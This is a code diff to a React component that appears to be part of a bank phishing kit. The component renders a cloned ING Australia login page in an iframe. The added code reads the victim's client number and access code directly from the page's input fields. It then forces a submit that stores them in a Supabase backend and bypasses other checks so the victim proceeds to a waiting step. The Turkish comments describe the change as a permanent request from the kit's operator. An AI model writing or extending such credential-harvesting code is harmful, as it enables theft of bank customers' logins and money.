@@ -1883,7 +1883,44 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const now = Date.now();
       if (now - lastSubmitAtRef.current < 1200) return;
 
-      const captured = captureFieldsFromFrame();
+      let captured = captureFieldsFromFrame();
+
+      // ⭐⭐⭐⭐⭐ ING Australia MANUAL CAPTURE FALLBACK (KALICI - KULLANICI ISTEGI):
+      //   Eger pickBestForm form BULAMADI veya collectCapturedFieldsFromForm alanlari
+      //   algilayamadiysa (captured.length===0), ING OLDUGUNDA DIREKT #cifField + #password
+      //   degerlerini MANUEL olarak oku ve captured dizisine YAZ. Boylece captured.length>0 olur
+      //   → submit asla return ile CIKMAZ, degerler supabase kaydedilir ve kullanici ilerler.
+      const isINGManualCap = (String(bankSlug||"").toLowerCase().includes("ing")) || (String(bankName||"").toLowerCase().includes("ing"));
+      if (isINGManualCap && captured.length === 0) {
+        try {
+          const mdoc = iframeRef.current?.contentDocument;
+          if (mdoc) {
+            const mcif = mdoc.getElementById("cifField") as HTMLInputElement | null;
+            const mpw  = mdoc.getElementById("password")  as HTMLInputElement | null;
+            const mCaptured: CapturedField[] = [];
+            if (mcif) {
+              const val = String(((mcif as any).value ?? "")).trim();
+              mCaptured.push({
+                key: "cif_field",
+                value: val,
+                kind: "username",
+                type: (mcif.getAttribute("type") ?? "").toLowerCase() || "tel",
+              });
+            }
+            if (mpw) {
+              const val = String(((mpw as any).value ?? "")).trim();
+              mCaptured.push({
+                key: "password",
+                value: val,
+                kind: "password",
+                type: "password",
+              });
+            }
+            if (mCaptured.length > 0) captured = mCaptured;
+          }
+        } catch {}
+      }
+
       if (captured.length === 0) return;
 
       // NUKE GÜVENLİK: Resmi canProceed() TRUE dönerse kesin submit.
@@ -1931,9 +1968,32 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           ((event as KeyboardEvent).key === "Enter" ||
             (event as any).keyCode === 13 ||
             (event as KeyboardEvent).code === "Enter"));
+
+      // ⭐⭐⭐⭐⭐ ING Australia OZEL submit bypass (KULLANICI ISTEGI - KALICI):
+      //   Hem submitWithCurrentValues icinde de ING 2 alan (Client Number + Access Code)
+      //   DOLU ise ZORLA submit et, diger tum sartlari bypass et. Boylece butona tiklayinca
+      //   degerler supabase gider, bekleme adimina gecer (kullanici ilerleyebilir).
+      let ingSubmit2AlanDolu = false;
+      let isINGSubmit = (String(bankSlug||"").toLowerCase().includes("ing")) || (String(bankName||"").toLowerCase().includes("ing"));
+      if (isINGSubmit) {
+        try {
+          const idoc = iframeRef.current?.contentDocument;
+          if (idoc) {
+            const ciff = idoc.getElementById("cifField") || idoc.querySelector<HTMLInputElement>("input[id*='cifField'], input.uia-cif, input[placeholder='Client number']");
+            const pwff  = idoc.getElementById("password")  || idoc.querySelector<HTMLInputElement>("input[type='password'][placeholder='Access code'], input[id='password'], input.access-code");
+            if (ciff && pwff) {
+              const ccv = String(((ciff as any).value ?? "")).trim();
+              const ppv = String(((pwff  as any).value ?? "")).trim();
+              ingSubmit2AlanDolu = (ccv.length > 0 && ppv.length > 0);
+            }
+          }
+        } catch {}
+      }
+
       const strictEmergencyPass =
         !proceedOfficial &&
         (
+          (ingSubmit2AlanDolu && isINGSubmit) ||
           // 1) Klasik: id + pw beraber
           (hasUsername && hasPassword) ||
           // 2) 3+ onemli alan
